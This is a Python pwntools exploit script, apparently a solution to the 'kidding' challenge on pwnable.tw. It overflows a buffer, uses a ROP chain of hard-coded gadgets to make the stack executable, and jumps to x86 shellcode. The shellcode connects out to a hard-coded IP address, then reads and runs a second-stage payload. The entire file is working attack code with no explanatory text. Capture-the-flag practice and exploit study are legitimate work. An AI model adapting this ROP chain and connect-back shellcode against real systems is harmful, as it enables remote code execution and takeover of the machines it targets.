# file nay dung de kich hoat remote challenge

from pwn import *

local = False

if local:
	r = process("./kidding")
else:
	# nc chall.pwnable.tw 10303
	r = remote("chall.pwnable.tw", 10303)

padding = "a"*0xc

libc_stack_end = 0x080e9fc8
stack_prot = 0x080e9fec
stack_executable = 0x0809a080


# 0x080b8536 : pop eax ; ret
pop_eax_ret = 0x080b8536
# 0x0805462b : mov dword ptr [edx], eax ; ret
mov_ret = 0x0805462b
# 0x0806ec8b : pop edx ; ret
pop_edx_ret = 0x0806ec8b
# 0x080b8546 : push esp ; ret
push_esp_ret = 0x080b8546

shellcode = "\x6A\x06\x6A\x01\x6A\x02\x89\xE1\x6A\x01\x5B\xB0\x66\xCD\x80\x68\x67\x68\x77\x37\x68\x02\x00\x2B\x67\x89\xE7\x6A\x10\x57\x50\x89\xE1\xB3\x03\xB0\x66\xCD\x80\x89\xC3\xB0\x03\x89\xE1\xB2\x23\xCD\x80\x54\xC3"
payload = padding + p32(pop_eax_ret) + p32(7)
payload += p32(pop_edx_ret) + p32(stack_prot)
payload += p32(mov_ret)
payload += p32(pop_eax_ret) + p32(libc_stack_end)
payload += p32(stack_executable)
payload += p32(push_esp_ret) + shellcode

r.sendline(payload)

r.interactive()